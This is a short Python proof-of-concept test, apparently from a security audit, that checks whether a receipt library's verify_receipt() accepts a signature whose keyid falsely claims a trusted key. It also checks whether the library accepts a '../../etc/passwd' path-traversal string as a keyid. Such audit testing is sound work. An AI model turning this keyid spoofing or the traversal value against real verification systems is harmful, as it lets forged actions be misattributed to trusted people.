#!/usr/bin/env python3
"""S2.3: keyid misattribution — sig block claims a trusted keyid, signed by
another key, and verify_receipt() never cross-checks keyid against the
verifying key. The signature entry's keyid is unauthenticated self-assertion;
any auditor tooling that maps keyid -> owner will misattribute the receipt.

Prints EXPLOIT-WORKS if a receipt whose claimed keyid belongs to a DIFFERENT
key than the one that actually signed verifies PASS with no warning.
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, generate_keypair, verify_receipt,
                         sha256_hex, keyid)

HUMAN = {"type": "human", "id": "s.lutar", "is_service_account": False,
         "auth_method": "hardware_key", "human_principal": "Stephen P. Lutar"}
POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

sk_trusted, pk_trusted = generate_keypair()
sk_evil, pk_evil = generate_keypair()

# Attacker signs with THEIR key but stamps the TRUSTED key's keyid.
r = build_receipt(action_id="a-990", subject_name="prod:svc", actor=HUMAN,
                  policy_decision=POL,
                  execution={"side_effect_class": "WRITE_REVERSIBLE", "status": "EXECUTED"},
                  evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk_evil)
r["signatures"][0]["keyid"] = keyid(pk_trusted)   # claim to be the trusted signer

# Auditor's harness resolves keys out-of-band and passes the attacker's key
# (e.g. the receipt arrived from the attacker's endpoint). The embedded keyid
# claiming the trusted identity is NEVER checked.
v = verify_receipt(r, pk_evil)
claimed = r["signatures"][0]["keyid"]
actual = keyid(pk_evil)
warned = any("keyid" in reason.lower() for reason in v.reasons)
print(f"[V1] claimed keyid={claimed} (trusted)  actual signer keyid={actual}")
print(f"     verdict={v.verdict}  keyid-mismatch-warning={warned}  reasons={v.reasons}")
exploit = (v.verdict == "PASS") and (claimed != actual) and not warned

# V2: garbage/non-hex keyid is equally accepted.
r2 = build_receipt(action_id="a-991", subject_name="prod:svc", actor=HUMAN,
                   policy_decision=POL,
                   execution={"side_effect_class": "WRITE_REVERSIBLE", "status": "EXECUTED"},
                   evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk_evil)
r2["signatures"][0]["keyid"] = "../../etc/passwd"
v2 = verify_receipt(r2, pk_evil)
print(f"[V2] keyid='../../etc/passwd' -> {v2.verdict}  reasons={v2.reasons}")
exploit = exploit or (v2.verdict == "PASS")

print("EXPLOIT-WORKS" if exploit else "HELD")
